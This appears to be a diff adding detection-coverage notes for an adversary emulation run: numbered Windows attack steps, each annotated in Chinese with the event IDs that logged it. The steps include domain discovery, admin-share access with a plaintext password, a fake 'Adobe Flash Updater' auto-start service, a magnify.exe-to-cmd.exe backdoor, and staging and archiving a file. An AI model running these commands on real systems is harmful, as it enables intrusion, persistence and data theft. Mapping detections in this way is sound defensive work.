@@ -1,0 +1,51 @@
+check   12.A.1	shell route print
+check   12.A.2	shell ipconfig /all
+check   12.B.1	shell whoami /all /fo list
+check   12.C.1	shell qprocess *
+check   12.D.1	shell net start
+check   12.F.1	shell net group "Domain Admins" /domain
+                net group \"Domain Admins\" /domain
+check   12.F.2	shell net localgroup "Administrators"
+12.G.1	shell net user
+12.G.2	shell net user /domain
+13.A.1	shell net group "Domain Computers" /domain
+13.B.1	shell net use
+13.B.2	shell netstat -ano
+13.C.1	shell reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+16.B.1	shell net use `\`\HFDC01\ADMIN$ /user:shire\pgustavo W1n1!19 
+                      name=\"Command\"; value=\"net use `\\`\\HFDC01\\ADMIN$ /user:shire\\pgustavo W1n1!19\"
+
+16.B.1	shell net use `\`\HFDC01\ADMIN$ /user:shire\pgustavo W1n1!19 
+
+
+16.C.1	shell net use /delete `\`\HFDC01\ADMIN$
+        name=\"Command\"; value=\"net use /delete `\\`\\HFDC01\\ADMIN$\""
+
+16.D.1	shell net use `\`\HFDC01\C$ password /user:shire\pgustavo
+                net use `\\`\\HFDC01\\C$ /user:shire\pgustavo W1n1!19
+16.D.1	shell net use `\`\HFDC01\C$ password /user:shire\pgustavo
+16.G.1	shell move-item c:\windows\autoupdate.vbs "\\HFDC01\C$\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\autoupdate.vbs"
+                move-item c:\\windows\\autoupdate.vbs \"\\\\HFDC01\\C$\\Users\\pgustavo\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs\"
+                只有event_id =800 和 4103
+16.H.1	shell c:\windows\system32\sc.exe \\HFDC01 query
+              c:\\windows\\system32\\sc.exe \\\\HFDC01 query
+16.I.1	shell C:\WINDOWS\system32\sc.exe `\`\HFDC01 create AdobeUpdater binPath= "cmd.exe /c `\`"C:\Users\pgustavo\AppData\Roaming\Adobe\Flash Player\autoupdate.vbs`\`" " DisplayName= "Adobe Flash Updater" start= auto
+16.J.1	shell c:\windows\system32\sc.exe `\`\HFDC01 qc AdobeUpdater
+16.K.1	shell type "c:\users\usrname\AppData\Roaming\Adobe\Flash Player\autoupdate.vbs"
+                type *Users\\pgustavo\\\\AppData\\Roaming\\Adobe\\Flash Player\\autoupdate.vbs\"
+                只有event_id =800 和 4103
+16.L.1	shell c:\windows\system32\sc.exe `\`\HFDC01 start AdobeUpdater
+17.A.1	shell reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"
+                只有event_id = 1,   reg.exe\" query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"  
+17.B.1	shell takeown.exe /F C:\Windows\system32\magnify.exe
+                只有event_id = 1,   takeown.exe\" /F C:\\Windows\\system32\\magnify.exe              
+17.B.2	shell c:\windows\system32\icacls.exe C:\windows\system32\magnify.exe /grant SYSTEM:F
+                只有event_id = 1,  icacls.exe\" C:\\windows\\system32\\magnify.exe /grant SYSTEM:F
+17.C.1	shell copy C:\Windows\system32\cmd.exe C:\windows\system32\magnify.exe
+                找不到
+18.A.1	shell get-childitem -Path \\HFDC01\IT\
+                只有event_id = 800,   name=\"Command\"; value=\"Get-Childitem -Path FileSystem::\\\\HFDC01\\IT\\\"
+18.B.1	shell Copy-Item \\HFDC01\IT\recipe.txt C:\"$"Recycle.Bin\recipe.txt
+                只有event_id = 800,    Copy-Item FileSystem::\\\\HFDC01\\IT\\recipe.txt C:\\\"$\"Recycle.Bin\\recipe.txt"
+19.B.1  shell recycler.exe a -t7z C:\"$"Recycle.Bin\old.7z C:\"$"Recycle.Bin\recipe.txt
+                只有event_id =800 和 4103,        name=\"Command\"; value=\"recycler.exe a -t7z C:\\\"$\"Recycle.Bin\\old.7z C:\\\"$\"Recycle.Bin\\recipe.txt\"
